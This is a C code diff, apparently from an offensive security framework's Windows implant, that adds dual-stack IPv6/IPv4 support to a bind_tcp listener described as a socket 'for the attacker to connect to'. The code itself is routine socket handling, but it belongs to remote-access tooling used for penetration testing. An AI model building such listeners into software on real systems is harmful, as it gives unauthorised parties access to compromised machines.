@@ -5,6 +5,16 @@
 #include "../../common/common.h"
 #include <ws2tcpip.h>
 
+// These fields aren't defined unless the SDK version is set to something old enough.
+// So we define them here instead of dancing with SDK versions, allowing us to move on
+// and still support older versions of Windows.
+#ifndef IPPROTO_IPV6
+#define IPPROTO_IPV6 41
+#endif
+#ifndef in6addr_any
+extern IN6_ADDR in6addr_any;
+#endif
+
 #ifdef USE_WINHTTP
 #include "win/server_setup_winhttp.h"
 #define server_dispatch_http server_dispatch_http_winhttp
@@ -177,15 +187,54 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 		return WSAGetLastError();
 	}
 
-	// prepare a connection listener for the attacker to connect to
-	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	// prepare a connection listener for the attacker to connect to, and we
+	// attempt to bind to both ipv6 and ipv4 by default, and fallback to ipv4
+	// only if the process fails.
+	BOOL v4Fallback = FALSE;
+	SOCKET listenSocket = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
 
-	struct sockaddr_in sock = { 0 };
-	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
-	sock.sin_family = AF_INET;
-	sock.sin_port = htons(port);
+	if (listenSocket == INVALID_SOCKET)
+	{
+		dprintf("[BIND] Unable to create IPv6 socket");
+		v4Fallback = TRUE;
+	}
+	else
+	{
+		int no = 0;
+		if (setsockopt(listenSocket, IPPROTO_IPV6, IPV6_V6ONLY, (char*)&no, sizeof(no)) == SOCKET_ERROR)
+		{
+			// fallback to ipv4 - we're probably running on Windows XP or earlier here, which means that to
+			// support IPv4 and IPv6 we'd need to create two separate sockets. IPv6 on XP isn't that common
+			// so instead, we'll just revert back to v4 and listen on that one address instead.
+			dprintf("[BIND] Unable to remove IPV6_ONLY option");
+			closesocket(listenSocket);
+			v4Fallback = TRUE;
+		}
+	}
 
-	if (bind(listenSocket, (SOCKADDR *)&sock, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
+	if (v4Fallback)
+	{
+		dprintf("[BIND] Falling back to IPV4");
+		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	}
+
+	struct sockaddr_in6 sockAddr = { 0 };
+
+	if (v4Fallback)
+	{
+		struct sockaddr_in* v4Addr = (struct sockaddr_in*)&sockAddr;
+		v4Addr->sin_addr.s_addr = htons(INADDR_ANY);
+		v4Addr->sin_family = AF_INET;
+		v4Addr->sin_port = htons(port);
+	}
+	else
+	{
+		sockAddr.sin6_addr = in6addr_any;
+		sockAddr.sin6_family = AF_INET6;
+		sockAddr.sin6_port = htons(port);
+	}
+
+	if (bind(listenSocket, (SOCKADDR *)&sockAddr, (v4Fallback ? sizeof(struct sockaddr_in) : sizeof(struct sockaddr_in6))) == SOCKET_ERROR)
 	{
 		return WSAGetLastError();
 	}
